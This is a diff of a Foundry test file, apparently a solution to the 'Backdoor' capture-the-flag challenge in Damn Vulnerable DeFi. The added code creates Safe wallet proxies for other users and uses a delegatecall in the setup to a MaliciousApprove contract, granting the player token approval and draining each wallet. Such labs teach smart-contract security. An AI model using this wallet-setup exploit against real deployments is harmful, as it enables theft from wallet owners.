@@ -4,9 +4,12 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {MaliciousApprove} from "./MaliciousApprove.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +73,29 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        MaliciousApprove maliciousApprove = new MaliciousApprove();
+
+        for (uint i = 0; i < users.length; ++i) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy), 
+                abi.encodeWithSelector(
+                    Safe.setup.selector,
+                    owners,
+                    1,
+                    address(maliciousApprove),
+                    abi.encodeWithSelector(maliciousApprove.approve.selector, address(token), player, AMOUNT_TOKENS_DISTRIBUTED),
+                    address(0),
+                    address(token),
+                    0,
+                    address(0)
+                ),
+                0,
+                IProxyCreationCallback(walletRegistry)
+            );
+            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
+        }
     }
 
     /**
